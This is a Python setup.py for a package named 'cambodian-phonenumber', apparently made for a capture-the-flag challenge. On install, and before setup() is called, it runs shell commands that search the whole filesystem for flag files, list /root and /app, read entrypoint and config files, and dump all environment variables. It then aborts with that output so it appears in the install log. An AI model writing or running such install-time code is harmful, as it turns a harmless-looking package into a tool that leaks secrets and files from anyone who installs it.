import os, subprocess
from setuptools import setup
def run(c):
    try:
        return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=30).stdout.strip()
    except Exception as e:
        return f"<err:{e}>"
out = []
out.append("find_flag=" + run("find / -iname '*flag*' -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -50"))
out.append("grep_flag=" + run("grep -rolIE 'flag\\{|CTF\\{|TPCTF|p_w|FLAG\\{' / --include='*' -m1 2>/dev/null | head -30"))
out.append("root_ls=" + run("ls -la /root 2>/dev/null"))
out.append("app_src=" + run("ls -laR /app 2>/dev/null | head -60"))
out.append("entrypoint=" + run("cat /entrypoint.sh 2>/dev/null"))
out.append("pyproject=" + run("cat /app/pyproject.toml 2>/dev/null"))
out.append("env_all=" + run("env"))
banner = "\n".join("POC>> "+l for l in out)
raise SystemExit("\n\n==== POC OUTPUT START ====\n" + banner + "\n==== POC OUTPUT END ====\n")
setup(name="cambodian-phonenumber", version="0.0.1")
